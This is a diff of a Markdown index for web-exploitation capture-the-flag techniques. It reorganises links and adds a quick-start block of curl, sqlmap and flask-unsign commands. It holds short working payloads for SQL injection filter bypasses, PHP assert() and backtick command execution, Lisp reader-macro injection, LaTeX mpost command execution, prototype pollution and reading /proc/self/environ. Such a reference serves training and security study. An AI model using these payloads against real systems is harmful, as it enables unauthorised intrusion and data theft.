@@ -41,7 +41,8 @@ go install github.com/ffuf/ffuf/v2@latest
 
 - [sql-injection.md](sql-injection.md) - SQL injection techniques: backslash/hex bypass, second-order SQLi, LIKE brute-force, MySQL column truncation, SQLi→SSTI chain, processList trick, XML entity WAF bypass, EXIF metadata injection, Shift-JIS encoding bypass, QR code input injection, double-keyword filter bypass, MySQL session variable dual-value injection, PHP PCRE backtrack WAF bypass, processlist race condition leak
 - [server-side.md](server-side.md) - Core server-side injection attacks: SSTI (Jinja2, Go, EJS, ERB Sequel bypass, Mako, Twig, `__dict__.update()` quote bypass), Python str.format() attribute traversal, SSRF (Host header, DNS rebinding, curl redirect), XXE, XML injection via X-Forwarded-For header, command injection (newline, blocklist bypass, sendmail, multi-barcode, git CLI newline injection), PHP type juggling, PHP file inclusion / php://filter, GraphQL injection (introspection, query batching/aliasing, string interpolation)
-- [server-side-exec.md](server-side-exec.md) - Code execution and server-side access attacks: Ruby/Perl/JS code injection, LaTeX injection RCE, PHP preg_replace /e RCE, PHP backtick eval under character limit, Prolog injection, Common Lisp #.() reader macro injection, ReDoS timing oracle, file upload→RCE (.htaccess, log poisoning, Python .so hijack, Gogs symlink, ZipSlip), PHP deserialization from cookies, PHP extract() variable overwrite, XPath blind injection, Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF bypass, SQLi keyword fragmentation bypass, SQL WHERE ORDER BY bypass, SQL injection via DNS records, bash brace expansion space-free injection, API filter injection, WebSocket mass assignment, PHP7 OPcache binary webshell + LD_PRELOAD disable_functions bypass, wget GET parameter filename trick, tar filename command injection, PNG/PHP polyglot upload + double extension + disable_functions bypass
+- [server-side-exec.md](server-side-exec.md) - Code execution and server-side access attacks: Ruby/Perl/JS code injection, LaTeX injection RCE, PHP preg_replace /e RCE, PHP backtick eval under character limit, PHP assert() injection, Prolog injection, ReDoS timing oracle, file upload→RCE (.htaccess, log poisoning, Python .so hijack, Gogs symlink, ZipSlip), PHP deserialization from cookies, PHP extract() variable overwrite, XPath blind injection, API filter injection, HTTP response header hiding, WebSocket mass assignment, Thymeleaf SpEL SSTI + Spring FileCopyUtils WAF bypass
+- [server-side-exec-2.md](server-side-exec-2.md) - Code execution and server-side access attacks (Part 2): SQLi keyword fragmentation bypass, SQL WHERE ORDER BY bypass, SQL injection via DNS records, bash brace expansion space-free injection, Common Lisp #.() reader macro injection, PHP7 OPcache binary webshell + LD_PRELOAD disable_functions bypass, wget GET parameter filename trick, tar filename command injection, PNG/PHP polyglot upload + double extension + disable_functions bypass, editor backup file source disclosure, date -f arbitrary file read, Apache mod_rewrite PATH_INFO bypass, PHP ReDoS code execution skip
 - [server-side-deser.md](server-side-deser.md) - Deserialization and execution attacks: Java deserialization (ysoserial gadget chains, JNDI injection, blind detection), Python pickle RCE (`__reduce__`, restricted unpickler bypass, STOP opcode chaining), PHP serialization length manipulation via filter word expansion, race conditions (TOCTOU async exploits, double-spend, coupon reuse)
 - [server-side-advanced.md](server-side-advanced.md) - Advanced server-side techniques: ExifTool CVE-2021-22204, Go rune/byte mismatch, zip symlink traversal, path traversal bypasses (brace stripping, double URL encoding, os.path.join, %2f), /dev/fd symlink to bypass /proc filter, Flask/Werkzeug debug mode, XXE external DTD filter bypass, WeasyPrint SSRF, MongoDB regex injection, Pongo2 Go template injection, ZIP PHP webshell, basename() bypass, React Server Components Flight RCE (CVE-2025-55182)
 - [server-side-advanced-2.md](server-side-advanced-2.md) - Advanced server-side techniques (Part 2): SSRF to Docker API RCE chain, Castor XML xsi:type deserialization (Atlas HTB), Apache ErrorDocument expression file read (Zero HTB), SQLite file path traversal to bypass string equality, HQL injection via non-breaking space, base64-encoded path traversal, Windows 8.3 short filename bypass, URL parse_url @ symbol bypass, PHP zip:// wrapper LFI via PNG/ZIP polyglot, XSS to SSTI chain via Flask error pages, INSERT INTO dual-field SQLi column shift, session cookie forgery via timestamp-seeded PRNG, SSRF via parse_url/curl double-@ URL parsing discrepancy, LaTeX RCE via mpost restricted write18 bypass, ElasticSearch Groovy script_fields RCE via SSRF
@@ -61,6 +62,32 @@ go install github.com/ffuf/ffuf/v2@latest
 - If the target is a native binary, custom VM, or firmware image, switch to `/ctf-reverse` first.
 - If the HTTP bug only gives you code execution and the hard part becomes memory corruption or seccomp escape, switch to `/ctf-pwn`.
 - If the "web" challenge really turns on JWT math, custom MACs, or crypto primitives, switch to `/ctf-crypto`.
+
+## Quick Start Commands
+
+```bash
+# Recon
+curl -sI https://target.com              # Headers
+ffuf -u https://target.com/FUZZ -w wordlist.txt  # Directory brute
+curl -s https://target.com/robots.txt
+
+# SQLi quick test
+sqlmap -u "https://target.com/page?id=1" --batch --dbs
+
+# JWT decode (no verification)
+echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+
+# Cookie decode (Flask)
+flask-unsign --decode --cookie '<cookie>'
+flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt
+
+# SSTI test payloads
+curl "https://target.com/page?name={{7*7}}"
+curl "https://target.com/page?name={{config}}"
+
+# Request inspection
+curl -v -X POST https://target.com/api -H "Content-Type: application/json" -d '{}'
+```
 
 ## Reconnaissance
 
@@ -86,23 +113,11 @@ username=\&password= OR 1=1--  # Backslash escape quote bypass
 0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
 ```
 
-XML entity encoding: `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` → `UNION` after XML parser decodes, bypasses WAF keyword filters.
+WAF bypasses: XML entity encoding (`&#x55;NION`), EXIF metadata injection (`exiftool -Comment="' UNION SELECT..."`), Shift-JIS `\u00a5`→`0x5c` backslash, QR code payload injection, double-keyword nesting (`selselectect`). See [sql-injection.md](sql-injection.md) for all techniques.
 
-EXIF metadata injection: embed SQL in image EXIF fields (`exiftool -Comment="' UNION SELECT flag FROM flags--" image.jpg`) to bypass WAFs that only inspect HTTP parameters.
+MySQL session variable dual-value injection: `@var:=` assigns return different values across sequential queries in one connection. PHP PCRE backtrack limit WAF bypass: 1M+ chars cause `preg_match()` to return `false`, passing `!false`. `information_schema.processlist` race condition leaks secrets from concurrent queries. See [sql-injection.md](sql-injection.md).
 
-Shift-JIS encoding bypass: `\u00a5` (yen sign) maps to `0x5c` (backslash) in SJIS, defeating Unicode-layer escape functions. See [sql-injection.md](sql-injection.md#shift-jis-encoding-sql-injection-boston-key-party-2016).
-
-SQL via QR codes: embed SQLi payload in QR image data; server decodes and queries without sanitization. See [sql-injection.md](sql-injection.md#sql-injection-via-qr-code-input-h4ckit-ctf-2016).
-
-SQL double-keyword filter bypass: nest stripped keyword inside itself (`selselectect`) so single-pass removal reconstructs it. See [sql-injection.md](sql-injection.md#sql-double-keyword-filter-bypass-defcamp-ctf-2016).
-
-MySQL session variable dual-value injection: `CASE WHEN @var IS NULL THEN @var:=2 ELSE @var:=@var-1 END` returns different values when the same injection is evaluated in sequential queries within one connection. See [sql-injection.md](sql-injection.md#mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017).
-
-PHP PCRE backtrack limit WAF bypass: append 1M+ characters to exceed `pcre.backtrack_limit` -- `preg_match()` returns `false` (not `0`), and `!false === true` bypasses the WAF. See [sql-injection.md](sql-injection.md#php-pcre-backtrack-limit-waf-bypass-secuinside-2017).
-
-information_schema.processlist race condition leak: race an injection query against concurrent application queries to capture secrets (AES keys, passwords) from `information_schema.processlist.INFO`. See [sql-injection.md](sql-injection.md#information_schemaprocesslist-race-condition-leak-secuinside-2017).
-
-See [sql-injection.md](sql-injection.md) for second-order SQLi, LIKE brute-force, MySQL column truncation, SQLi→SSTI chains, XML entity WAF bypass, EXIF metadata injection. See [server-side-exec.md](server-side-exec.md) for SQLi via DNS records, SQLi keyword fragmentation, PHP preg_replace /e RCE, Prolog injection.
+See [server-side-exec.md](server-side-exec.md) for PHP preg_replace /e RCE and Prolog injection. See [server-side-exec-2.md](server-side-exec-2.md) for SQLi via DNS records and SQLi keyword fragmentation.
 
 ## XSS Quick Reference
 
@@ -205,7 +220,7 @@ DNS rebinding for TOCTOU: https://lock.cmpxchg8b.com/rebinder.html
 
 When cat/head blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`
 
-**Bash brace expansion (space-free injection):** `{ls,-la,..}` expands to `ls -la ..` without literal spaces. See [server-side-exec.md](server-side-exec.md#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016).
+**Bash brace expansion (space-free injection):** `{ls,-la,..}` expands to `ls -la ..` without literal spaces. See [server-side-exec-2.md](server-side-exec-2.md#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016).
 
 **Git CLI newline injection:** `%0a` in URL path breaks out of backtick/system() shell calls that only filter `;|&<>`. See [server-side.md](server-side.md#git-cli-newline-injection-via-url-path-bsidessf-2026).
 
@@ -243,7 +258,7 @@ See [server-side.md](server-side.md#php-file-inclusion--phpfilter) for filter ch
 - **LaTeX restricted write18 bypass:** When `write18` is restricted, `mpost -ini "-tex=bash -c (cmd)" file.mp` uses mpost's whitelisted status to execute arbitrary commands. `${IFS}` replaces spaces. See [server-side-advanced-2.md](server-side-advanced-2.md#latex-rce-via-mpost-restricted-write18-bypass-33c3-ctf-2016).
 **PHP backtick eval (character limit):** `` echo`cat *`; `` -- PHP backticks = `shell_exec()`, fits RCE in as few as 8 chars. Use `` `$_GET[0]`; `` to move payload to URL parameter. See [server-side-exec.md](server-side-exec.md#php-backtick-eval-under-character-limit-easyctf-2017).
 **PHP assert() injection:** `assert("strpos('$input', '..') === false")` — inject `') || system('cmd');//` for RCE (PHP < 7.2). See [server-side-exec.md](server-side-exec.md#php-assert-string-evaluation-injection-csaw-ctf-2016).
-**Common Lisp `read` injection:** `#.(run-shell-command "cat /flag")` — reader macro evaluates at parse time. See [server-side-exec.md](server-side-exec.md#common-lisp-injection-via-reader-macro-insomnihack-2016).
+**Common Lisp `read` injection:** `#.(run-shell-command "cat /flag")` — reader macro evaluates at parse time. See [server-side-exec-2.md](server-side-exec-2.md#common-lisp-injection-via-reader-macro-insomnihack-2016).
 **Ruby ObjectSpace scanning:** `ObjectSpace.each_object(String)` dumps all in-memory strings including flag. See [server-side-exec.md](server-side-exec.md#ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016).
 
 See [server-side-exec.md](server-side-exec.md) for full payloads and bypass techniques.
@@ -266,15 +281,7 @@ Concurrent requests bypass check-then-act patterns (balance, coupons, registrati
 **VM escape:** `this.constructor.constructor("return process")()` → RCE
 **Full chain:** pollution → enable JS eval in Happy-DOM → VM escape → RCE
 
-**Prototype pollution permission bypass (Server OC, Pragyan 2026):**
-```bash
-# When Express.js endpoint checks req.body.isAdmin or similar:
-curl -X POST -H 'Content-Type: application/json' \
-  -d '{"Path":"value","__proto__":{"isAdmin":true}}' \
-  'https://target/endpoint'
-# __proto__ pollutes Object.prototype, making isAdmin truthy on all objects
-```
-**Key insight:** Always try `__proto__` injection on JSON endpoints, even when the vulnerability seems like something else (race condition, SSRF, etc.).
+**Prototype pollution permission bypass:** `{"__proto__":{"isAdmin":true}}` on JSON endpoints pollutes `Object.prototype`. Always try `__proto__` injection even when the vulnerability seems like something else.
 
 See [node-and-prototype.md](node-and-prototype.md) for detailed exploitation.
 
@@ -288,16 +295,10 @@ See [node-and-prototype.md](node-and-prototype.md) for detailed exploitation.
 - Password inference: profile data + structured ID format → brute-force
 - Weak signature: check if only first N chars of hash are validated
 - Affine cipher OTP: only 312 possible values (`12 mults × 26 adds`), brute-force all in seconds
-- TOTP srand(time()) weakness: PHP `srand(time())` seeds PRNG predictably; sync server clock to predict TOTP codes. See [auth-and-access.md](auth-and-access.md#totp-recovery-via-php-srandtime-seed-weakness-tum-ctf-2016)
-- Express.js `%2F` middleware bypass: `/api/export%2Fchat` skips `app.all("/api/export/chat")` middleware; nginx decodes `%2F` before proxying
-- IDOR (Insecure Direct Object Reference) on WIP endpoints: grep for `WIP`/`TODO`/`debug` comments, compare auth decorators against production endpoints
-- Git history credential leakage: `git log -p --all -S "password"` finds deleted secrets
-- CI/CD variable theft: GitLab/Jenkins/GitHub CI/CD variables store service account tokens
-- Identity provider API takeover: admin token → set any user's password, bypass MFA with `not_configured_action: skip`
-- SAML SSO automation: preserve `RelayState` through entire flow, submit signed `SAMLResponse` to callback
-- Guacamole parameter extraction: API token or MySQL access exposes SSH keys and passphrases
-- Login page poisoning: inject credential logger into login page, harvest automated logins from `/dev/shm/creds.txt`
-- TeamCity REST API RCE: admin creds → create project → add build step → trigger build (runs as build agent user, often root)
+- TOTP srand(time()) weakness: sync server clock to predict codes. See [auth-and-access.md](auth-and-access.md#totp-recovery-via-php-srandtime-seed-weakness-tum-ctf-2016)
+- Express.js `%2F` middleware bypass, IDOR on WIP endpoints, git history credential leakage
+- CI/CD variable theft, identity provider API takeover (bypass MFA: `not_configured_action: skip`)
+- SAML SSO automation, Guacamole parameter extraction, login page poisoning, TeamCity REST API RCE
 
 ## Apache CVE-2012-0053 HttpOnly Cookie Leak
 
@@ -322,9 +323,9 @@ See [auth-and-access.md](auth-and-access.md) for access control bypasses, [auth-
 - Python `.so` hijack: write malicious shared object + delete `.pyc` to force reimport
 - ZipSlip: symlink in zip for file read, path traversal for file write
 - Log poisoning: PHP payload in User-Agent + path traversal to include log
-- PNG/PHP polyglot + double extension: valid PNG with `<?php` after IEND chunk, uploaded as `.png.php`; when `disable_functions` blocks exec, use `scandir('/')` + `file_get_contents()` for flag. See [server-side-exec.md](server-side-exec.md#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026).
+- PNG/PHP polyglot + double extension: valid PNG with `<?php` after IEND chunk, uploaded as `.png.php`; when `disable_functions` blocks exec, use `scandir('/')` + `file_get_contents()` for flag. See [server-side-exec-2.md](server-side-exec-2.md#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026).
 
-See [server-side-exec.md](server-side-exec.md) for detailed steps.
+See [server-side-exec.md](server-side-exec.md) and [server-side-exec-2.md](server-side-exec-2.md) for detailed steps.
 
 ## Multi-Stage Chain Patterns
 
@@ -335,15 +336,6 @@ See [server-side-exec.md](server-side-exec.md) for detailed steps.
 - CRLF in headers → CSP bypass + cache poisoning + XSS in one shot
 - Arbitrary file write in Python → `.so` hijacking or `.pyc` overwrite for RCE
 - Lowercased response body → use hex escapes (`\x3c` for `<`)
-
-## Useful Tools
-
-```bash
-sqlmap -u "http://target/?id=1" --dbs       # SQLi
-ffuf -u http://target/FUZZ -w wordlist.txt   # Directory fuzzing
-flask-unsign --decode --cookie "eyJ..."      # JWT decode
-hashcat -m 16500 jwt.txt wordlist.txt        # JWT crack
-```
 
 ## Flask/Werkzeug Debug Mode
 
@@ -471,7 +463,7 @@ Deobfuscate client-side JS to extract hardcoded HMAC secret, then forge signatur
 
 ## SQLi Keyword Fragmentation Bypass (SecuInside 2013)
 
-Single-pass `preg_replace()` keyword filters bypassed by nesting the stripped keyword inside the payload: `unload_fileon` → `union` after `load_file` removal. See [server-side-exec.md](server-side-exec.md#sqli-keyword-fragmentation-bypass-secuinside-2013).
+Single-pass `preg_replace()` keyword filters bypassed by nesting the stripped keyword inside the payload: `unload_fileon` → `union` after `load_file` removal. See [server-side-exec-2.md](server-side-exec-2.md#sqli-keyword-fragmentation-bypass-secuinside-2013).
 
 ## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)
 
@@ -503,10 +495,4 @@ Server builds XML from headers without escaping. Inject `</ip><admin>true</admin
 
 ## Common Flag Locations
 
-```text
-/flag.txt, /flag, /app/flag.txt, /home/*/flag*
-Environment variables: /proc/self/environ
-Database: flag, flags, secret tables
-Response headers: x-flag, x-archive-tag, x-proof
-Hidden DOM: display:none elements, data attributes
-```
+Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`. Env: `/proc/self/environ`. DB: `flag`, `flags`, `secret` tables. Headers: `x-flag`, `x-archive-tag`, `x-proof`. DOM: `display:none` elements, `data-*` attributes.
